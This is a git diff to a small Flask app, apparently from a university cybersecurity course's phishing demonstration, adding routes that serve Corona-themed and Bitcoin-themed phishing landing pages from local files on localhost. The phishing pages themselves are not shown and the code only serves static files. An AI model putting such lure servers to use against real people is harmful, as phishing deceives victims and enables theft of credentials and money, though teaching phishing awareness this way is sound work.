@@ -4,10 +4,25 @@ app = Flask(__name__, static_url_path='')
 app.config.from_pyfile('config.py', silent=True)
 app._static_folder = ""
 
+# Corona phishing site
+
 @app.route('/neuerAntrag')
-def root():
-    return send_file('E:\Studium\Semester 3\MPSE Experiencing Cyber Security\git\Phishing Demo\Landing Pages\html\corona.html')
-    #return app.send_static_file('antrag.html')
+def corona():
+    return send_file(r'E:\Studium\Semester 3\MPSE Experiencing Cyber Security\git\Phishing Demo\Landing Pages\html\corona.html')
+#   return app.send_static_file('antrag.html')
+
+
+# Bitcoin phishing site
+
+@app.route('/bitcoin')
+def bitcoin():
+    return send_file(r'E:\Studium\Semester 3\MPSE Experiencing Cyber Security\git\Phishing Demo\Landing Pages\html\bitcoin.html')
+
+
+@app.route('/bitcoin/bitcoin.png')
+def bitcoin_image():
+    return send_file(r'E:\Studium\Semester 3\MPSE Experiencing Cyber Security\git\Phishing Demo\Landing Pages\html\bitcoin.png')
+
 
 if __name__ == "__main__":
     app.run(host='127.0.0.1', port=443,
